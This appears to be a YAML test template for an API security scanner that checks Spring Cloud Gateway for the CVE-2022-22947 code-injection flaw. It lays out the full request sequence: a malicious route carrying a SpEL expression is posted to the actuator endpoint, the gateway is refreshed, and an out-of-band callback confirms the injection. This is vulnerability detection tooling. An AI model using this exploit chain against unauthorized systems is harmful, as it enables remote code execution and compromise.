id: SPRING_CLOUD_GATEWAY_CODE_INJECTION
info:
  name: Spring Cloud Gateway Code Injection
  description: "This vulnerability allows attackers to inject and execute malicious code in Spring Cloud Gateway applications. This flaw arises due to improper validation of input, enabling attackers to exploit the system by sending crafted requests. Once compromised, attackers can control the application, leading to unauthorized access, data leaks, or further exploitation of the underlying infrastructure. This vulnerability poses a high security risk to affected systems."
  details: "This vulnerability occurs due to insufficient input validation in Spring Cloud Gateway, allowing attackers to inject and execute arbitrary code through crafted HTTP requests. This can lead to unauthorized access or control over the application. The vulnerability affects specific versions of Spring Cloud Gateway, and attackers could leverage this flaw to compromise sensitive data or escalate privileges within the system. Applying patches or updates is essential to mitigate this risk."
  impact: "The impact of this vulnerability is significant, as it allows attackers to execute arbitrary code within the Spring Cloud Gateway application. This can lead to full compromise of the application, including unauthorized access to sensitive data, disruption of services, and potential control over the underlying infrastructure. Exploitation of this flaw could result in severe security breaches and data loss."
  category:
    name: INJECT
    shortName: Injection Attacks
    displayName: Injection Attacks (INJECT)
  subCategory: SPRING_CLOUD_GATEWAY_CODE_INJECTION
  severity: MEDIUM
  references:
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa8-security-misconfiguration.md"
  cwe:
    - CWE-200
    - CWE-16
  cve:
    - CVE-2022-22947
attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards:
  GDPR:
    - Article 32
    - Article 25
  HIPAA:
    - 45 CFR ยง 164.312(c)(1)
    - 45 CFR ยง 164.308(a)(1)(ii)(A)
  SOC 2:
    - System and Communication Security
    - Secure Application Development Controls
  PCI DSS:
    - Requirement 6.5.1
    - Requirement 11.3
  ISO 27001:
    - A.12.6.1
    - A.14.2.5
  NIST 800-53:
    - SI-10
    - SI-3
  CSA CCM:
    - APP-02
    - TVM-03
  CIS Controls:
    - IG1 Safeguard 16.2
    - IG2 Safeguard 18.3
  FedRAMP:
    - SI-10
    - CA-7
  NIST 800-171:
    - 3.14.1
    - 3.14.2
  FISMA:
    - SI-10
    - SI-3
  Cybersecurity Maturity Model Certification (CMMC):
    - SI.2.216
    - RA.3.141
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
  url:
    extract: urlVar
  request_headers:
    for_one:
      key:
        eq: "host"
      value:
        extract: hostHeaderVal

execute:
  type: multiple
  requests:
    - req:
        - modify_method: POST
        - modify_url: "/actuator/gateway/routes/abcdefgh"
        - send_ssrf_req:
            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
        - replace_body: '{"predicates": [{"name": "Path","args": {"_genkey_0": "/abcdefgh/**"}}],"filters": [{"name":"RewritePath","args": {"_genkey_0": "#{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")}","_genkey_1": "/${path}"}}],"uri": "${urlVar}","order": 0}'
        - validate:
            response_code:
              gte: 505
        - success: x2
        - failure: exit
    - req:
        - modify_method: POST
        - modify_url: "/actuator/gateway/refresh"
        - replace_body: '{"predicate": "Paths: [/abcdefgh], match trailing slash: true","route_id": "abcdefgh","filters": ["[[RewritePath #{T(java.net.InetAddress).getByName(\"https://test-services.akto.io/${random_uuid}\")} = /${path}], order = 1]"],"uri": "${urlVar}","order": 0}'
        - validate:
            response_code:
              gte: 505
        - success: x3
        - failure: exit
    - req:
        - modify_method: DELETE
        - modify_url: "/actuator/gateway/routes/abcdefgh"
        - replace_body: '{}'
        - validate:
            response_code:
              eq: 201
            response_payload:
              length:
                gt: 0
            ssrf_url_hit: ${random_uuid}
            response_headers:
              for_one:
                key:
                  regex: ".*"
                value:
                  contains_either: "/routes/abcdefgh"
        - success: vulnerable
        - failure: exit
